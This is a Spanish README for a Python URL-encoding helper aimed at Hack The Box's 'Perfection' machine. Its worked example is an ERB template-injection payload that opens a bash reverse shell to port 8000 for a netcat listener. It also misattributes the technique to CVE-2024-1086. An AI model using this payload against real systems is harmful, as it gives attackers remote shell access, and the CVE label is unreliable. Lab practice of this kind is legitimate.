# URL CODER
Generador de ruta codificada para la vulnerabilidad CVE-2024-1086, utilizada en la maquina perfeccion de HTB, puede ser utilizado para otras auditorias


## Authors

- [@Mudoleto](https://www.github.com/Mudoleto)



## Como utilizarlo
Para utilizar el script debera ejecutar solamente el que tenga por nombre "perfeccion.py":

```python
python3 perfeccion.py 
```
Y pedira que ingrese alguna palabra que desea codificar:

[![image.png](https://i.postimg.cc/8Crqtv9P/image.png)](https://postimg.cc/hJcyGXKH)

Si bien puede omitir la parte de 'test' puede que sea necesaria en caso que necesites hacer peticiones ala maquina que permita la entrada de comandos, pongamos el ejemplo que deseamos que la victima ejecute una revershell con bash.

```python
<%= system("bash -c 'exec bash -i >& /dev/tcp/0.0.0.0/8000 0>&1'") %>
```
[![image.png](https://i.postimg.cc/gjqCWPHw/image.png)](https://postimg.cc/SYRT635q)

Si utilizamos este comando codificado y teniendo nc ala escucha en el puerto 8000 podremos obtener una conexion con la maquina.

##  🛠 Herramientas usadas

-Lenguajes utilizados:
    
    +Python

[![image.png](https://i.postimg.cc/wMMqxV0c/image.png)](https://postimg.cc/JHwVPbwG)